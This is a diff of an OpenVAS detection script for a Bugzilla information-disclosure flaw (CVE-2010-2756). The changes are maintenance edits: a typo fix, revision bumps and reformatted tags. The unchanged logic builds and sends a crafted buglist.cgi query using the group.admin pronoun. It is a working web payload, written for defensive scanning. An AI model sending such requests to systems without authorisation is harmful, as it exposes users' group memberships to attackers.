@@ -1,8 +1,8 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bugzilla_info_disclosure_vuln.nasl 8527 2018-01-25 07:33:25Z ckuersteiner $
+# $Id: gb_bugzilla_info_disclosure_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
-# Bugzilla Informaton Disclosure Vulnerability
+# Bugzilla Information Disclosure Vulnerability
 #
 # Authors:
 # Antu Sanadi <santu@secpod.com>
@@ -29,21 +29,21 @@ CPE = "cpe:/a:mozilla:bugzilla";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801570");
-  script_version("$Revision: 8527 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-25 08:33:25 +0100 (Thu, 25 Jan 2018) $");
+  script_version("$Revision: 11997 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
   script_cve_id("CVE-2010-2756");
   script_bugtraq_id(42275);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 
-  script_name("Bugzilla Informaton Disclosure Vulnerability");
+  script_name("Bugzilla Information Disclosure Vulnerability");
 
-  script_xref(name: "URL", value: "http://secunia.com/advisories/41128");
-  script_xref(name: "URL", value: "http://www.vupen.com/english/advisories/2010/2205");
-  script_xref(name: "URL", value: "http://www.vupen.com/english/advisories/2010/2035");
-  script_xref(name: "URL", value: "http://www.vupen.com/english/advisories/2010/2035");
-  script_xref(name: "URL", value: "https://bugzilla.mozilla.org/show_bug.cgi?id=417048");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/41128");
+  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2205");
+  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2035");
+  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2035");
+  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=417048");
 
   script_tag(name:"qod_type", value:"remote_vul");
 
@@ -54,21 +54,21 @@ if(description)
   script_mandatory_keys("bugzilla/installed");
   script_require_ports("Services/www", 80);
 
-  script_tag(name: "impact", value: "Successful exploitation will allows attackers to search for bugs that were
+  script_tag(name:"impact", value:"Successful exploitation will allows attackers to search for bugs that were
 reported by users belonging to one more groups.");
 
-  script_tag(name: "affected", value: "Bugzilla 2.19.1 to 3.2.7, 3.3.1 to 3.4.7, 3.5.1 to 3.6.1 and 3.7 to 3.7.2");
+  script_tag(name:"affected", value:"Bugzilla 2.19.1 to 3.2.7, 3.3.1 to 3.4.7, 3.5.1 to 3.6.1 and 3.7 to 3.7.2");
 
-  script_tag(name: "insight", value: "The flaw is due to an error in 'Search.pm' which allows remote attackers to
+  script_tag(name:"insight", value:"The flaw is due to an error in 'Search.pm' which allows remote attackers to
 determine the group memberships of arbitrary users via vectors involving the Search interface, boolean charts, and
 group-based pronouns.");
 
-  script_tag(name: "solution", value: "Upgrade to Bugzilla version 3.2.8, 3.4.8, 3.6.2 or 3.7.3. For updates refer
-to http://www.bugzilla.org/download/");
-
-  script_tag(name: "summary", value: "This host is running Bugzilla and is prone to information disclosure
+  script_tag(name:"solution", value:"Upgrade to Bugzilla version 3.2.8, 3.4.8, 3.6.2 or 3.7.3.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"This host is running Bugzilla and is prone to information disclosure
 vulnerability.");
 
+  script_xref(name:"URL", value:"http://www.bugzilla.org/download/");
   exit(0);
 }
 
@@ -84,17 +84,14 @@ infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: TRUE
 vers = infos['version'];
 dir = infos['location'];
 
-## check for  only vuln versions
 if(version_in_range(version:vers, test_version: "3.7", test_version2:"3.7.2")||
    version_in_range(version:vers, test_version: "3.5.1", test_version2:"3.6.1")||
    version_in_range(version:vers, test_version: "3.3.1", test_version2:"3.4.7")||
    version_in_range(version:vers, test_version: "2.19.1", test_version2:"3.2.7")) {
-  ## Construct the exploit string
   exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" +
             "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0"+
             "%3D%25group.admin%25";
 
-  ## Construct the request
   req = string("GET ", dir, exploit, " HTTP/1.1\r\n",
                "Host: 209.132.180.131\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
@@ -107,7 +104,6 @@ if(version_in_range(version:vers, test_version: "3.7", test_version2:"3.7.2")||
   resp = http_keepalive_send_recv(port:port, data:req);
 
   if (resp) {
-     ## Check for the exploit
      if (eregmatch(pattern:"field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i",
                   string:resp, icase:TRUE)) {
        security_message(port: port);
